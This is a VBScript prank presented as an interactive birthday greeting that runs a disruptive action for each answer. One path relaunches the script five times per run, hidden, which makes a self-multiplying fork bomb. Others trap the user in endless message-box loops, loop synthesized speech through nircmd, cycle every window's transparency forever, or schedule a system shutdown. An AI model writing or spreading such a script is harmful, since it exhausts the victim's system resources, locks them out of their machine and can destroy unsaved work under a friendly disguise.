Set WshShell = CreateObject("WScript.Shell")

Set FileSystem = CreateObject("Scripting.FileSystemObject")
Dim scriptDir
scriptDir = FileSystem.GetParentFolderName(WScript.ScriptFullName)

Dim nirCmd
nirCmd = scriptDir & "\nircmd.exe"

Dim initial
initial = MsgBox("having a good birthday?", 323, "happy birthday!")

If (initial = 6) Then
    MsgBox "im so glad you are!", 64, "happy birthday!"
    Dim glad
    glad = MsgBox("wanna be more glad?", 68, "happy birthday!")
    If (glad = 6) Then
        MsgBox "here you go", 64, ":)"
        WshShell.Run "cmd.exe /c start """" ""wscript.exe"" """ & WScript.ScriptFullName & """",0,false
        WshShell.Run "cmd.exe /c start """" ""wscript.exe"" """ & WScript.ScriptFullName & """",0,false
        WshShell.Run "cmd.exe /c start """" ""wscript.exe"" """ & WScript.ScriptFullName & """",0,false
        WshShell.Run "cmd.exe /c start """" ""wscript.exe"" """ & WScript.ScriptFullName & """",0,false
        WshShell.Run "cmd.exe /c start """" ""wscript.exe"" """ & WScript.ScriptFullName & """",0,false
    Else
        Do While 2>1
            MsgBox "you're no fun.", 16, ">:("
            MsgBox "i mean it.", 16, ">:("
        Loop
    End If
ElseIf (initial = 7) Then
    Dim sad
    sad = MsgBox("aw... do you want to make it better?", 68, ":(")
    If (sad = 6) Then
        MsgBox "i wont let you down!", 64, ":)"
        WshShell.Run """" & nircmd & """ loop 100 100 speak text ""Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You! Happy Birthday to You!"
    Else
        MsgBox "fine! have a sad, transparent birthday then.",16,">:("
        WshShell.Run """" & scriptDir & "\you_rn.jpg"""
        Do While 2>1
            WshShell.Run """" & nircmd & """ win trans alltop 255"
            WScript.Sleep 2000
            WshShell.Run """" & nircmd & """ win trans alltop 127"
            WScript.Sleep 2000
            WshShell.Run """" & nircmd & """ win trans alltop 1"
            WScript.Sleep 2000
            WshShell.Run """" & nircmd & """ win trans alltop 127"
            WScript.Sleep 2000
        Loop
    End If
Else 
    MsgBox "cancel your birthday? if you say so!", 16, "no more happy birthday!"
    WshShell.Run "shutdown /s /t 300 /c ""No more birthday for you."""
End If
